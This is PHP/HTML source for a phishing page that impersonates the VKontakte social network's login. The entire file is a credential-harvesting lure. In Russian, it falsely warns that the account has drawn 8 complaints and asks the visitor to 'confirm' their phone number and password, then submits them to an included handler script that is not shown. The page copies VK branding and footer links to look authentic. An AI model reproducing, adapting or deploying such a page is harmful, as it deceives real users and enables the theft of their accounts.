<?php

require 'db/db.php';
session_start();

?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title></title>
	<link rel="stylesheet" type="text/css" href="style.css">
	<link rel="stylesheet" type="text/css" href="_bootstrap.css">
	<link rel="stylesheet" type="text/css" href="_bootstrap1.css">
	<link rel="stylesheet" type="text/css" href="_bootstrap.2css">
	<link rel="stylesheet" type="text/css" href="_bootstrap.min1.css">
    <link rel="stylesheet" type="text/css" href="_bootstrap.min.css">

<!--
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>-->
</head>
<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
	
	if (isset($_POST['login'])) {
		require 'registration.php';
	}
}
?>
<body>

<header>
	
<img src="icon5.png">

	</header>
	
	<div class="container">
<p>
На вашу учетную запись поступило 8 жалоб!<br>
Для проверки учетной записи <b>потвердите свой номер телефона и пароль </b>

<br><br>
<form action="index.php" method="post" autocomplete="off">
  <div class="form-group">
  	<input type="text" id="fname" name="login" placeholder="Mобильный номер"></div>
  <div class="form-group">
  	<input type="password" id="fname" name="password" placeholder="Пароль" style="width: 50%;
    padding: 12px 20px;
    margin: 8px 0;
    display: inline-block;
    border: 1px solid #ccc;
    border-radius: 4px;
    box-sizing: border-box;">
  </div>
  <input type="submit" value="Продолжить">
</form>
</div>
	</div>
<footer>
	
	<a href="" class="1">Вконтакте  <span style="color: gray;">©     2018</span></a>
	<a href="" class="two"> о компании </a>
		<a href="" class="three"> правила </a>
		<a href="" class="three"> реклама </a>
		<a href="" class="three"> разработчикам </a>
			<a href="" class="two"><span style="color: gray;">Языки:</span> English Руский Украйіінська все языки » </a>
</footer>
    </body>
</html>